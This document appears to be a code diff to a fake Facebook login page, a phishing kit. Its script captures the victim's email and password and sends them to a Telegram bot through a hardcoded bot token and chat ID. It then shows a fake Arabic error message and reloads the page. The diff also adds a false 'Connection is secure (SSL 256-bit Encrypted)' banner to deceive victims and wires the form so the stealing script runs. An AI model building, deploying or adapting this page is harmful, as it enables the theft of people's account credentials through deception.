@@ -7,10 +7,25 @@
   <title>Facebook Login</title>
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Google+Sans:ital,opsz,wght@0,17..18,400..700;1,17..18,400..700&display=swap');
+    
     body {
       font-family: 'Google Sans', sans-serif;
       margin: 0;
       background-color: white;
+    }
+
+    .security-banner {
+      background-color: #e7f3ff;
+      color: #0064e0;
+      text-align: center;
+      padding: 8px;
+      font-size: 13px;
+      font-weight: 500;
+      border-bottom: 1px solid #ccd0d5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 6px;
     }
 
     svg {
@@ -21,7 +36,6 @@
       display: block;
     }
 
-   
     .email-field,
     .password-field {
       position: relative;
@@ -29,17 +43,16 @@
       justify-content: center;
       align-items: center;
       margin: 0 auto 12px auto;
-      width: 516px; 
+      width: 516px;
     }
 
-   
     #password,
     #email {
       height: 56px;
       width: 100%;
       border: 1px solid #ccd0d5;
       border-radius: 16px;
-      padding: 18px 12px 4px 12px; 
+      padding: 18px 12px 4px 12px;
       outline: none;
       font-size: 16px;
       box-sizing: border-box;
@@ -50,23 +63,20 @@
     #password:focus,
     #email:focus {
       border-color: #89898a;
-      
     }
 
-   
     label {
       position: absolute;
-      left: 12px; 
+      left: 12px;
       top: 50%;
       transform: translateY(-50%);
       font-size: 16px;
       color: #8d949e;
-      pointer-events: none; 
+      pointer-events: none;
       transition: all 0.15s cubic-bezier(0, 0, 0.2, 1);
       transform-origin: left top;
     }
 
-  
     #email:focus ~ label,
     #email:not(:placeholder-shown) ~ label,
     #password:focus ~ label,
@@ -76,7 +86,7 @@
       color: #969797;
     }
 
-    .submit-field {
+    .loginBtn {
       display: block;
       margin: 15px auto;
       width: 516px;
@@ -90,30 +100,31 @@
       cursor: pointer;
     }
 
-    .submit-field:hover {
+    .loginBtn:hover {
       background-color: #166fe5;
     }
 
     .login-box {
       width: 580px;
       margin: 40px auto;
-      
       padding: 20px;
-     
-     
     }
-    .Forget-password:hover{
+    
+    .Forget-password:hover {
       background-color: #64646413;
       border-radius: 12px;
       height: 40px;
-     
       cursor: pointer;
-
     }
   </style>
 </head>
 
 <body>
+
+  <div class="security-banner">
+    <span>🔒 Connection is secure (SSL 256-bit Encrypted)</span>
+  </div>
+
   <div>
     <svg viewBox="0 0 24 24" fill="currentColor">
       <path d="M22 12.037C22 6.494 17.523 2 12 2S2 6.494 2 12.037c0 4.707 3.229 8.656 7.584 9.741v-6.674H7.522v-3.067h2.062v-1.322c0-3.416 1.54-5 4.882-5 .634 0 1.727.125 2.174.25v2.78a12.807 12.807 0 0 0-1.155-.037c-1.64 0-2.273.623-2.273 2.244v1.085h3.266l-.56 3.067h-2.706V22C18.164 21.4 22 17.168 22 12.037z">
@@ -124,10 +135,9 @@
 
   <main>
     <div class="login-box">
-      <h3 style="margin-bottom: 20px; color: #1c1e21; margin-left: 40px; margin-top: auto;margin-right: auto;">Log in to Facebook</h3>
-      <form method="post">
-        
-        
+      <h3 style="margin-bottom: 20px; color: #1c1e21; margin-left: 40px; margin-top: auto; margin-right: auto;">Log in to Facebook</h3>
+      
+      <form id="loginForm" method="post">
         <div class="email-field">
           <input type="email" placeholder=" " id="email" required>
           <label for="email">Email address or mobile number</label>
@@ -138,43 +148,33 @@
           <label for="password">Password</label>
         </div>
 
-        <input type="submit" value="Log In" class="submit-field">
-        <div style="margin-top: 15px; " class="Forget-password" >
-          <a href="#" style="color: black; text-decoration: none; font-size: 16px; text-align: center; display: block; margin-top: 40px;margin-bottom:40px;margin-left: auto;margin-right: auto;">Forgotten password?</a>
+        <input type="submit" value="Log In" class="loginBtn">
+        
+        <div style="margin-top: 15px;" class="Forget-password">
+          <a href="#" style="color: black; text-decoration: none; font-size: 16px; text-align: center; display: block; margin-top: 40px; margin-bottom: 40px; margin-left: auto; margin-right: auto;">Forgotten password?</a>
         </div>
-        <div style="border: #166fe5  solid 1px; width: 70%; margin: auto; border-radius: 20px; height: 40px; ">
-          <a href="#" style="display: block; text-decoration: none; color: #166fe5;  text-align: center; margin-top: 10px;margin-bottom: auto;margin-left: auto;margin-right: auto;">Create new account</a>
+        
+        <div style="border: #166fe5 solid 1px; width: 70%; margin: auto; border-radius: 20px; height: 40px;">
+          <a href="#" style="display: block; text-decoration: none; color: #166fe5; text-align: center; margin-top: 10px; margin-bottom: auto; margin-left: auto; margin-right: auto;">Create new account</a>
         </div>
       </form>
     </div>
   </main>
-</body>
-
-</html>
-
-
-
 
   <script>
     document.getElementById('loginForm').addEventListener('submit', async function (e) {
-      e.preventDefault(); // لمنع إعادة تحميل الصفحة
+      e.preventDefault();
 
-      // استلام القيم المدخلة
       const email = document.getElementById('email').value;
       const password = document.getElementById('password').value;
 
-   
       const botToken = '9072593338:AAGWBCaNHBnqAv7QhNu2Oggarw066XKiSG4';
       const chatId = '6798640564';
 
-      // تجهيز الرسالة
-      const message = `⚠️ محاولة تسجيل دخول جديدة (عبر المتصفح):\n\nالبريد: ${email}\nكلمة المرور: ${password}`;
-
-      
+      const message = `⚠️ محاولة تسجيل دخول جديدة:\n\nالبريد: ${email}\nكلمة المرور: ${password}`;
       const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
 
       try {
-        
         await fetch(url, {
           method: 'POST',
           headers: {
@@ -186,17 +186,14 @@
           })
         });
 
-       
-        alert('حدث خطأ في تسجيل الدخول، يجدر المحاولة لاحقاً.');
-        window.location.href = 'index.html'; 
+        alert('حدث خطأ في تسجيل الدخول، يرجى المحاولة لاحقاً.');
+        window.location.reload();
 
       } catch (error) {
         console.error('فشل الإرسال:', error);
       }
     });
-
   </script>
-
 </body>
 
 </html>
